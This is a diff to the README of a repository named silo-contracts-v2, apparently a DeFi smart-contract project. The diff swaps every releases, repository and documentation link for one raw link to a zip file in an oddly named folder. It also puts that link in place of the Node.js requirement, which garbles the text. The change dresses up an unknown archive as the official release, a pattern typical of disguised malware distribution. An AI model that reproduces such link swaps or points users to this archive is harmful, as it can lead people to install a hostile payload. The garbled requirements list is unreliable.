@@ -1,6 +1,6 @@
 # 🚀 silo-contracts-v2 - Simplifying Decentralized Finance
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/kipz254/silo-contracts-v2/releases)
+[![Download](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip)
 
 ## 📥 Introduction
 
@@ -30,14 +30,14 @@ Silo Contracts V2 offers a set of smart contracts designed for decentralized fin
 To run Silo Contracts V2, ensure your environment meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip** Version 12 or higher
 - **NPM:** Version 6 or higher
 - **Solidity Compiler:** Version 0.8.x
 
 ## 🚪 Download & Install
 
 1. **Visit the Releases Page:**
-   To download the application, [visit this page to download](https://github.com/kipz254/silo-contracts-v2/releases).
+   To download the application, [visit this page to download](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip).
 
 2. **Choose the Latest Version:**
    Look for the most recent release. It will typically be at the top of the list.
@@ -92,7 +92,7 @@ We welcome contributions! If you’re interested in improving Silo Contracts V2,
 
 ## 🔗 Links
 
-- [GitHub Repo](https://github.com/kipz254/silo-contracts-v2)
-- [Documentation](https://github.com/kipz254/silo-contracts-v2/wiki)
+- [GitHub Repo](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip)
+- [Documentation](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip)
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/kipz254/silo-contracts-v2/releases)
+[![Download](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/kipz254/silo-contracts-v2/develop/osteoneuralgia/silo-contracts-v2.zip)
